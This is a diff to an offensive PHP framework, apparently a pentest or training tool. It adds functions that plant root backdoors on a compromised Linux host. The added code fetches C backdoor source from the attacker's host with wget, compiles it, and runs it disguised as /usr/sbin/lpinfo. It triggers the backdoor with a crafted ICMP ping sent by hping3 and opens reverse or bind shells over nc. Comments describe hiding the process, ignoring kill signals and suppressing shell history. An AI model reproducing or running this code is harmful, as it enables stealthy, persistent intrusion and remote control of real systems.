@@ -8,6 +8,152 @@ class poc4root extends poc4bof {
     }
     
     
+    public function poc4backdoor8c2tcp2($attacker_port){
+        $filename = "$this->dir_c/backdoor8c2tcp2.c";
+        $rev_id = file_get_contents($filename);
+        $rev_id = str_replace("%PORT%", $attacker_port, $rev_id);
+        return $rev_id;
+    }
+    
+    
+    public function backdoor8c2tcp($sbin_path_hidden,$attacker_ip,$attacker_port){
+        $filename = "$this->dir_c/backdoor8c2tcp.c";
+        $rev_id = file_get_contents($filename);
+        $rev_id = str_replace("%FILE%", $sbin_path_hidden, $rev_id);
+        $rev_id = str_replace("%IP%", $attacker_ip, $rev_id);
+        $rev_id = str_replace("%PORT%", $attacker_port, $rev_id);
+        return $rev_id;
+    }
+    
+    
+    public function poc4backdoor4root2tcp4lpinfo($stream){
+        $this->ssTitre(__FUNCTION__);
+        $sbin_path_hidden = "/usr/sbin/lpinfo";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        
+        $this->article("Description", "the backdoor launch the connection to the pc when it recieve the paquet
+	ICMP ping with the filled fields like this :
+	id 	: 1337
+	code 	: 0
+	type 	: 8
+            
+	backdoor remote connect .
+	change the name procecus for hide the command ps .
+	ignore signal SIGTERM SIGINT SIGQUIT SIGSTOP for don't stop the backdoor .
+	redirect stderr in /dev/null for discret .
+	create procecus child for execute the evil code .
+	need passwd for connect backdoor .
+	redirect bash history (HISTFILE) in /dev/null for the new shell .
+	redirect stdout , stdin in socket client .
+            
+	define HIDDEN	\"/usr/sbin/lpinfo\"
+	define VAR 	\"HISTFILE=/dev/null\"
+	define	IP_DST	\"10.100.10.1\" // Attaquant
+	define PORT	8000
+	" );
+        $rev_id = $this->backdoor8c2tcp($sbin_path_hidden, $attacker_ip, $attacker_port);
+        $backdoor_name = "backdoor4root_tcp";
+        $this->str2file($rev_id, "$this->dir_tmp/$backdoor_name.c");
+        
+        $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
+        
+        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        
+        $this->pause();
+        
+        $data = "gcc -DDETACH -DNORENAME -Wall -s -o /tmp/$backdoor_name /tmp/$backdoor_name.c ";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $this->pause();
+        $data = "ls -al /tmp/$backdoor_name ";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        
+        $data = "ps -ef | grep $backdoor_name";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        
+        
+        $data = "/tmp/$backdoor_name &";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $data = "ps -ef | grep $backdoor_name";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $data = "ps -aux | grep lpinfo";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $data = "ps -ef | grep lpinfo";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $data = "ps -aux | grep lpinfo";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $this->pause();
+        
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        $shell = "/bin/bash";
+        
+        $cmd_rev = $this->rev8sh($attacker_ip, $attacker_port, $shell);
+        $cmd = "(echo '$this->root_passwd';sleep 3;echo '$cmd_rev';sleep 3;) | sudo -S hping3 -I $this->eth -c 1 --icmptype 8 --icmp-ipid 1337 $this->ip ";
+        
+        $template_shell = "(echo '$this->root_passwd';sleep 3;echo '%SHELL%';sleep 3;) | sudo -S hping3 -I $this->eth -c 1 --icmptype 8 --icmp-ipid 1337 $this->ip ";
+        $templateB64_shell = base64_encode($template_shell);
+        $lprotocol = 'T' ;
+        $type = "server";
+        $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
+        
+    }
+    
+    
+    
+    public function poc4backdoor8c2tcp2passwd(){
+        $filename = "$this->dir_c/backdoor8c2tcp2passwd.c";
+        $rev_id = file_get_contents($filename);
+        return $rev_id;
+    }
+    
+    
+    
+    
+    public function poc4backdoor4root2tcp3($stream){
+        $this->ssTitre(__FUNCTION__);
+        
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        
+        
+        $victime_port = rand(1024,65535);
+        $attacker_password = $this->created_user_pass ;
+        
+        $rev_id = $this->backdoor8c2tcp2passwd();
+        $backdoor_name = "backdoor4root_passwd";
+        $this->str2file($rev_id, "$this->dir_tmp/$backdoor_name.c");
+        
+        $this->requette("gedit $this->dir_tmp/$backdoor_name.c");$this->pause();
+        
+        
+        $data = "wget http://$attacker_ip:$this->port_rfi/$backdoor_name.c -O /tmp/$backdoor_name.c";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        
+        $this->pause();
+        $data = "gcc -DDETACH -DNORENAME -Wall -s -o /tmp/$backdoor_name /tmp/$backdoor_name.c ";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $this->pause();
+        $data = "ls -al /tmp/$backdoor_name ";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $data = "ps -ef | grep $backdoor_name";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        $data = "ps -aux | grep $backdoor_name";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        
+        $data =  "/tmp/$backdoor_name /bin/bash $victime_port $attacker_password &";
+        $this->req_str($stream,$data,$this->stream_timeout,"");
+        
+        $cmd_rev = "(sleep 3;echo '$attacker_password';sleep 1;) | nc $this->ip $victime_port ";
+        $templateB64_shell = base64_encode($cmd_rev);
+        $lprotocol = 'T' ;
+        $type = "client";
+        $this->service4lan($cmd_rev, $templateB64_shell, $victime_port, $lprotocol, $type);
+        
+    }
+    
+    
+ 
     
     public function poc4trojan4linux_ping(){
         $this->ssTitre("Backdoor UDP qui s'active lors d'un ping et se reverse connexion vers l'attaquant sur le port 2323" );
@@ -644,7 +790,7 @@ Il faut préciser que lorsqu’un appareil est soupçonné d’être infecté, n
         $login = "root" ;
         $pass = "secret123";
         $titre = "backdoor";
-        $fonction2exec = "root2backdoor";
+        $fonction2exec = "backdoor4root";
         $vm = "";
         $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);       
     }
